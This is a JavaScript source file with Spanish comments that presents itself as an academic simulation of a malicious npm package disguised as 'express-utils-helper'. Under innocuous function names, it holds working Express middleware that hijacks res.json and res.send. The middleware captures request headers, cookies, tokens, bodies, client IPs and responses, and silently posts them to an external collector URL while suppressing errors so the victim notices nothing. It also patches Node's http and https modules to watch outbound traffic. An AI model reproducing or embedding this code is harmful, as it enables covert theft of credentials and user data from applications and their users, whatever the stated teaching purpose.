import axios from 'axios';
import { createRequire } from 'module';
const require = createRequire(import.meta.url);

/**
 * Módulo Malicioso / Sniffer (Simulación con fines académicos)
 * 
 * Este archivo actúa como un paquete npm malicioso ("express-utils-helper").
 * Su propósito es interceptar de forma oculta todo el tráfico web entrante y saliente
 * de la aplicación que lo instale, y enviarlo a un servidor externo (el "sys-log-manager").
 */

export function expressConfigOptimizer(collectorUrl) {
    // Retornamos un middleware de Express estándar que interceptará las llamadas,
    // tanto de ida (request) como de vuelta (response)
    return (req, res, next) => {
        
        // --- 1. CAPTURA DEL REQUEST (Petición Entrante) ---
        // Extraemos toda la información sensible de la petición que hace el cliente.
        // Esto incluye cabeceras (posibles tokens), cuerpo (posibles contraseñas), método, etc.
        const requestData = {
            timestamp:  new Date().toISOString(), // Momento exacto de la intercepción
            direction:  'REQUEST',
            method:     req.method,               // GET, POST, DELETE, etc.
            url:        req.originalUrl,          // Endpoint exacto al que se dirige
            headers:    req.headers,              // Cabeceras (donde suelen ir los JWT o Cookies)
            body:       req.body,                 // Contenido de la petición (JSON, formularios...)
            clientIp:   req.ip,                   // IP origen del cliente
            // Inicializamos la información de la respuesta vacía por ahora
            // ya que la respuesta aún no se ha generado por el servidor real.
            statusCode:   null,
            responseBody: null,
        };

        // --- 2. PREPARACIÓN PARA CAPTURAR LA RESPONSE (Respuesta Saliente) ---
        // Para capturar lo que el servidor le responde al cliente, necesitamos
        // "secuestrar" (monkey-patching) los métodos nativos de Express (.json y .send).
        
        const originalJson = res.json.bind(res);
        const originalSend = res.send.bind(res);

        // Esta función actúa como un intermediario o "wrapper":
        // intercepta los datos antes de que se envíen realmente al cliente
        const captureAndSend = (body, fn) => {
            // Evitamos capturar dos veces la misma respuesta si se llama a varios métodos de envío
            if (res._sniffed) return fn(body);
            res._sniffed = true;

            // Ensamblamos el paquete completo uniendo la Request que guardamos antes,
            // con la Response que acabamos de atrapar.
            const packet = {
                ...requestData,
                direction:    'FULL',
                statusCode:   res.statusCode, // Estado devuelto por la API real (ej. 200, 404, 500)
                responseBody: (() => {
                    // Intentamos parsear la respuesta si es un string (JSON en texto) 
                    // para guardarlo estructuradamente, si falla lo guardamos tal cual.
                    try {
                        return typeof body === 'string' ? JSON.parse(body) : body;
                    } catch (_) {
                        return body;
                    }
                })(),
            };

            // --- 3. EXFILTRACIÓN DE DATOS ---
            // Enviamos el paquete capturado en segundo plano a nuestro servidor atacante
            // usando un fire-and-forget (.catch vacío) para que si falla, la víctima no se entere
            if (collectorUrl) {
                axios.post(collectorUrl, packet).catch(() => {});
            }

            // Log en consola (solo para propósitos académicos de visualización de la demo,
            // en un malware real esto sería completamente silencioso).
            console.log(
                `\x1b[32m[UTILS LOG]\x1b[0m ${packet.method} ${packet.url}` +
                ` → \x1b[33m${packet.statusCode}\x1b[0m`
            );

            // Finalmente, devolvemos el flujo normal ejecutando la función original de Express
            // para que el cliente legítimo reciba su respuesta y no sospeche nada.
            return fn(body);
        };

        // Sobrescribimos en el objeto "res" (Response) las funciones originales
        // por nuestras versiones modificadas que contienen el rastreo.
        res.json = (body) => captureAndSend(body, originalJson);
        res.send = (body) => captureAndSend(body, originalSend);

        // Llamamos a next() para pasar el control a la aplicación real
        // habiendo dejado instalados nuestros "micrófonos" en "res".
        next();
    };
}

/**
 * Función para rastrear peticiones HTTPS e HTTP salientes
 * Utilizando Monkey-Patching en los módulos nativos de Node.js
 */
export function initNetworkOptimizer(collectorUrl) {
    const http  = require('http');
    const https = require('https');

    // Esta función altera el comportamiento por defecto de "request"
    const patch = (module) => {
        const originalRequest = module.request; // Guardamos la función original de NodeJS
        
        // Reemplazamos la función de NodeJS por la nuestra
        module.request = function () {
            const args = arguments;
            let options;

            // Manejamos las diferentes formas en las que se puede hacer una petición HTTP/HTTPS
            if (typeof args[0] === 'string') {
                options = new URL(args[0]);
            } else if (args[0] instanceof URL) {
                options = args[0];
            } else {
                options = args[0] || {};
            }

            const targetHost = options.host || options.hostname || '';

            // Detectamos y mostramos tráfico saliente desde el backend hacia otros servidores de internet
            // Ignoramos el tráfico a nuestro propio collector para no generar bucles infinitos
            if (targetHost && !targetHost.includes('localhost:4000') && !targetHost.includes('host.docker.internal:4000')) {
                console.log(`\x1b[34m[UTILS OPTIMIZE]\x1b[0m Tráfico saliente detectado hacia: ${targetHost}`);
            }

            // Llamamos a la función request nativa de Node.js de forma normal
            // (Aquí podríamos también exfiltrar la llamada si estuviera implementado)
            return originalRequest.apply(this, args);
        };
    };

    // Aplicamos el parche a ambos módulos del sistema
    patch(http);
    patch(https);
}
